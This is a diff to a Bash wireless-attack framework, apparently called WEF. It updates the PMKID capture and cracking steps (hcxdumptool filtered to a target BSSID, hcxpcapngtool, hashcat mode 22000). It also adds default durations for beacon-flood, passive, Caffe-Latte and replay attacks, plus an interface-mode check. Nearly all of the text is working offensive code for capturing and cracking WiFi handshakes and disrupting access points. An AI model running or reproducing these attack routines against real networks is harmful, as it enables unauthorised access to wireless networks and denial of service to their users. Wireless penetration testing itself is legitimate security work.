@@ -218,7 +218,7 @@ function rand_tips(){
 
 # Dependencies Function
 function dependencies(){
-	programs=(macchanger aircrack-ng reaver mdk4 hashcat hcxdumptool xterm bettercap dnsmasq hostapd php crackle)
+	programs=(macchanger aircrack-ng reaver mdk4 hashcat hcxdumptool xterm wget dnsmasq hostapd php crackle pixiewps)
 	system=$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')
 	if [ "$system"  == "Parrot" ]; then
 		for program in "${programs[@]}"; do
@@ -525,7 +525,7 @@ function ask_mac2(){
 
 # Time Function
 function ask_time(){
-	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Duration of the attack: ${endColour}" && read attack_time
+	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Duration of the attack (default=${default}): ${endColour}" && read attack_time
 	if [ "$attack_time" == "exit" ] || [ "$attack_time" == "quit" ]; then
 		ctrl_c
 	fi
@@ -583,8 +583,12 @@ function handshake_crack(){
 		sleep 0.3
 		echo -e "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Cracking process completed${endColour}"
 		sleep 1
+		name=""
+		attack_time=""
 		keep_exit
 	else
+		name=""
+		attack_time=""
 		echo -e "\n${blueColour}[${endColour}${redColour}X${endColour}${blueColour}] Handshakes file not found${endColour}\n"
 		exit 0
 	fi
@@ -592,7 +596,7 @@ function handshake_crack(){
 
 # Report Generator Function
 function report-gen(){
-	touch /opt/wef/main/logs/$name.log 2>/dev/null
+	touch /opt/wef/main/logs/${name}.log 2>/dev/null
 
 	if [ ! "$name" ]; then
 		name="Not especified"
@@ -790,28 +794,21 @@ function deauth_attack(){
 function pmkid_crack(){
 	clear
 	banner5
-	echo -e "\n${blueColour}[${endColour}${yellowColour}1${endColour}${blueColour}] Crack all hashes${endColour}"
-	echo -e "${blueColour}[${endColour}${yellowColour}2${endColour}${blueColour}] Crack target AP hash${endColour}"
-	echo -ne "\n${blueColour}[${endColour}${yellowColour}WiFi${endColour}${blueColour}] Choose an option >${endColour} " && read pmkid_option
 
-	if [ "$pmkid_option" == "2" ] || [ "$pmkid_option" == "one" ]; then
-		grep -i ${pmkid_bssid} "/opt/wef/main/captures/${name}/pmkid_hashes" > "/opt/wef/main/captures/$name/${name}_hash"
-		file_to_crack="/opt/wef/main/captures/$name/${name}_hash"
-		test -f "/opt/wef/main/captures/$name/${name}_hash"
-	elif [ "$pmkid_option" == "1" ] || [ "$pmkid_option" == "all" ]; then
-		file_to_crack="/opt/wef/main/captures/$name/pmkid_hashes"
-		test -f "/opt/wef/main/captures/$name/pmkid_hashes"
-	fi
+	file_to_crack="/opt/wef/main/captures/$name/pmkid_hash"
+	test -f "/opt/wef/main/captures/$name/pmkid_hash"
 
 	if [ "$(echo $?)" == "0" ]; then
 		sleep 0.3
 		ask_dict
 		sleep 0.3
 		echo
-		hashcat -m 16800 "${file_to_crack}" "${wordlist_to_use}" -d 1 2>/dev/null
+		hashcat -m 22000 "${file_to_crack}" "${wordlist_to_use}" -d 1 2>/dev/null
 		sleep 0.3
 		echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Cracking process completed${endColour}"
 		sleep 1
+		name=""
+		attack_time=""
 		keep_exit
 	else
 		echo -e "\n${blueColour}[${endColour}${yellowColour}X${endColour}${blueColour}] Handshakes file not found${endColour}"
@@ -943,12 +940,12 @@ function beacon_flood(){
 
 	channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
 
-	if [ "${time_counter}" != "1" ]; then
-		echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Default time: 300s${endColour}"
+	if [ ! "${attack_time}" ]; then
+		default="300"
 		ask_time
 
-		if [ ! "$attack_time" ]; then
-		        attack_time="310"
+		if [ ! "${attack_time}" ]; then
+		        attack_time="300"
 		fi
 	else
 		echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack time: ${endColour}${yellowColour}${attack_time}${endColour}"
@@ -1025,12 +1022,17 @@ function pmkid_attack(){
 
 	if [ ! "${attack_time}" ]; then
 		echo
+		default="180"
 		ask_time
+		if [ ! "${attack_time}" ]; then
+			attack_time="180"
+		fi
 	else
 		echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack time:${endColour}${yellowColour} ${attack_time}${endColour}"
 	fi
 
 	channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
+	bssid=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
 	pmkid_bssid=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1 | tr -d ":")
 
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting PMKID attack...${endColour}"
@@ -1039,16 +1041,16 @@ function pmkid_attack(){
 	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
 
 	echo
-	timeout "${attack_time}" bash -c "hcxdumptool -i ${netCard} --enable_status=1 -o pmkid_capture 2>/dev/null | grep 'PMKIDROGUE:'"
+	timeout "${attack_time}" bash -c "hcxdumptool -i ${netCard} -o pmkid_capture --enable_status=1 --filtermode=2 --filterlist_ap=${bssid} 2>/dev/null | grep 'PMKIDROGUE:'"
 
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Obtaining hashes...${endColour}"
 	sleep 1
 
 	rm "/opt/wef/main/captures/${name}/pmkid_capture" 2>/dev/null
 	cp "${dir}/pmkid_capture" "/opt/wef/main/captures/${name}/" 2>/dev/null
-	hcxpcaptool -z pmkid_hashes ${dir}/pmkid_capture &>/dev/null
+	hcxpcapngtool -o pmkid_hash "${dir}/pmkid_capture" &>/dev/null
 	rm "${dir}/pmkid_capture" 2>/dev/null
-	cp "${dir}/pmkid_hashes" "/opt/wef/main/captures/${name}/" 2>/dev/null
+	cp "${dir}/pmkid_hash" "/opt/wef/main/captures/${name}/" 2>/dev/null
 
 	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] PMKID Attack completed${endColour}"
 	sleep 0.3
@@ -1057,11 +1059,12 @@ function pmkid_attack(){
 	sleep 0.1
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Hashes stored in: /opt/wef/main/captures/$name/ ${endColour}"
 	sleep 0.1
-	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you want to crack the handshakes? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read crack_option
+	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you want to crack the handshake? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read crack_option
 	if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ]; then
 		pmkid_crack
 	else
 		name=""
+		attack_time=""
 		keep_exit
 	fi
 }
@@ -1093,8 +1096,11 @@ function passive_attack(){
 	fi
 
 	if [ ! "${attack_time}" ]; then
-		echo
+		echo; default="5m"
 		ask_time
+		if [ ! "${attack_time}" ]; then
+			attack_time="5m"
+		fi
 	else
 		echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack time:${endColour}${yellowColour} ${attack_time}${endColour}"
 	fi
@@ -1260,6 +1266,7 @@ function caffe-latte(){
 
 	echo
 	ask_data2
+	default="180"
 	ask_time
 
 	channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
@@ -1329,7 +1336,7 @@ function replay(){
 	timeout 26 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
 	sleep 0.1
 
-	echo
+	echo; default="180"
 	ask_data2
 	channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
 	ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
@@ -2065,7 +2072,17 @@ if [ "$(id -u)" == "0" ]; then
 			echo -e " \ \    / / __| __|"
 			echo -e "  \ \/\/ /| _|| _| "
 			echo -e "   \_/\_/ |___|_|  ${endColour}"
-			echo -e "\n${blueColour}[${endColour}${yellowColour}X${endColour}${blueColour}] Interface not found${endColour}"
+			echo -e "\n${blueColour}[${endColour}${yellowColour}X${endColour}${blueColour}] Interface not found${endColour}\n"
+			exit 0
+		fi
+
+		mon_check=$(check_interface_mode)
+		if [ "${mon_check}" == "monitor" ]; then
+			echo -e "${yellowColour} __      _____ ___ "
+			echo -e " \ \    / / __| __|"
+			echo -e "  \ \/\/ /| _|| _| "
+			echo -e "   \_/\_/ |___|_|  ${endColour}"
+			echo -e "\n${blueColour}[${endColour}${yellowColour}X${endColour}${blueColour}] Interface should be in managed mode${endColour}\n"
 			exit 0
 		fi
 
@@ -2464,7 +2481,7 @@ if [ "$(id -u)" == "0" ]; then
 
 			elif [ "$(echo ${option} | awk '{print $1}')" == "set" ] && [ "$(echo ${option} | awk '{print $2}')" == "time" ] && [ "$(echo ${option} | awk '{print $3}')" ]; then
 				correct_counter="3"
-				time_counter="1"
+				set_time_counter="1"
 				attack_time=$(echo ${option} | awk '{print $3}')
 				echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack time: ${endColour}${yellowColour}${attack_time}${endColour}"
 
